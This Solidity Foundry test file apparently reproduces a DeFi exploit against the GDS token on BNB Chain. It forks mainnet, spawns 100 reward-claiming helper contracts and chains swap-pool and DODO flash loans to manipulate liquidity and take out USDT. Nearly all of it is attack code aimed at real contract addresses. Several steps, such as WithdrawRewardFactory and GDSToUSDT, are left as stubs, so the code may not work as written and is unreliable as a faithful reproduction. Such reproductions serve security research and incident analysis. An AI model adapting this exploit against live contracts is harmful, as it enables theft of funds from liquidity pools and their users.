// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/interface/interface.sol";
import "forge-std/console2.sol";

interface GDSToken is IERC20 {
    function pureUsdtToToken(uint256 _uAmount) external returns (uint256);
}

interface ISwapFlashLoan {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes memory params
    ) external;
}

interface IClaimReward {
    function transferToken() external;

    function withdraw() external;
}

contract ClaimReward {
    address Owner;
    GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);
    Uni_Router_V2 Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address deadAddress = 0x000000000000000000000000000000000000dEaD;

    constructor() {
        Owner = msg.sender;
        console2.log("Owner: ", Owner);
    }

    function transferToken() external {
        console2.log("aaa ", GDS.balanceOf(address(this)));
        console2.log("usdt2 : ", GDS.balanceOf(address(USDT)));
        GDS.transfer(deadAddress, GDS.pureUsdtToToken(1 * 1e18));
        Pair.transfer(Owner, Pair.balanceOf(address(this)));
        console2.log("transfered: ", Pair.balanceOf(address(Owner)));
    }

    function withdraw() external {
        console2.log("-withdraw-");
    }
}

contract ContractTest is DSTest {
    GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);
    Uni_Router_V2 Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address deadAddress = 0x000000000000000000000000000000000000dEaD;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    ISwapFlashLoan swapFlashLoan =
        ISwapFlashLoan(0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13);
    address dodo = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
    address[] contractList;
    uint256 PerContractGDSAmount;
    uint256 SwapFlashLoanAmount;
    uint256 dodoFlashLoanAmount;

    function setUp() public {
        cheats.createSelectFork("bsc", 24_449_918);
        cheats.label(address(GDS), "GDS");
        cheats.label(address(USDT), "USDT");
    }

    function testExploit() public {
        console2.log("--- start Exploit --- ", address(this));
        address(WBNB).call{value: 50 ether}("");
        //WBNB.transfer(address(this), 50 ether);
        console2.log("WBNB: ", WBNB.balanceOf(address(this)));
        console2.log("USDT: ", USDT.balanceOf(address(this)));
        WBNBToUSDT();
        console2.log("WBNB: ", WBNB.balanceOf(address(this)));
        console2.log("USDT: ", USDT.balanceOf(address(this)));
        USDTToGDS(10 * 1e18);
        console2.log("GDS: ", GDS.balanceOf(address(this)));
        console2.log("USDT: ", USDT.balanceOf(address(this)));

        GDSUSDTAddLiquidity(10 * 1e18, GDS.balanceOf(address(this)));
        USDTToGDS(USDT.balanceOf(address(this)));
        PerContractGDSAmount = GDS.balanceOf(address(this)) / 100;
        console2.log("PerContractGDSAmount: ", PerContractGDSAmount);
        ClaimRewardFactory();
        cheats.roll(block.number + 1100);
        SwapFlashLoan();
        console2.log(
            "attacker USDT: ",
            USDT.balanceOf(address(this)) - 50 * 250 * 1e18,
            USDT.decimals()
        );
    }

    function SwapFlashLoan() internal {
        SwapFlashLoanAmount = USDT.balanceOf(address(swapFlashLoan));
        swapFlashLoan.flashLoan(
            address(this),
            address(USDT),
            SwapFlashLoanAmount,
            new bytes(1)
        );
    }

    function ClaimRewardFactory() internal {
        for (uint256 i = 0; i < 100; i++) {
            ClaimReward claim = new ClaimReward();
            contractList.push(address(claim));
            Pair.transfer(address(claim), Pair.balanceOf(address(this)));
            GDS.transfer(address(claim), PerContractGDSAmount);
            claim.transferToken();
        }
    }

    function executeOperation(
        address pool,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata params
    ) public {
        console2.log("executeOperation");
        DODOFLashLoan();
        USDT.transfer(address(swapFlashLoan), 1e18);
    }

    function DODOFLashLoan() public {
        console2.log("DODOFLashLoan");
        dodoFlashLoanAmount = USDT.balanceOf(dodo);
        DVM(dodo).flashLoan(
            0,
            dodoFlashLoanAmount,
            address(this),
            new bytes(1)
        );
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        console2.log("DPPFlashLoanCall");
        USDTToGDS(600_000 * 1e18);
        GDSUSDTAddLiquidity(
            USDT.balanceOf(address(this)),
            GDS.balanceOf(address(this))
        );
        WithdrawRewardFactory();
        GDSUSDTRemoveLiquidity();
        GDSToUSDT();
        USDT.transfer(dodo, dodoFlashLoanAmount);
    }

    function DPPFlashLoanCall() public {
        console2.log("DPPFlashLoanCall");
    }

    function WithdrawRewardFactory() public {
        console2.log("WithdrawRewardFactory");
    }

    function WBNBToUSDT() internal {
        WBNB.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDT);

        Router.swapExactTokensForTokens(
            1 ether,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function USDTToGDS(uint256 USDTAmount) internal {
        USDT.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(GDS);
        Router.swapExactTokensForTokens(
            USDTAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function GDSUSDTAddLiquidity(
        uint256 USDTAmount,
        uint256 GDSAmount
    ) internal {
        USDT.approve(address(Router), type(uint256).max);
        GDS.approve(address(Router), type(uint256).max);
        Router.addLiquidity(
            address(USDT),
            address(GDS),
            USDTAmount,
            GDSAmount,
            0,
            0,
            address(this),
            block.timestamp
        );
        console2.log("amount pair: ", Pair.balanceOf(address(this)));
    }

    function GDSToUSDT() internal {
        console2.log("GDSToUSDT");
        GDS.approve(address(Router), type(uint256).max);
    }

    function GDSUSDTRemoveLiquidity() internal {
        Pair.approve(address(Router), type(uint256).max);
        Router.removeLiquidity(
            address(USDT),
            address(GDS),
            Pair.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );
    }
}
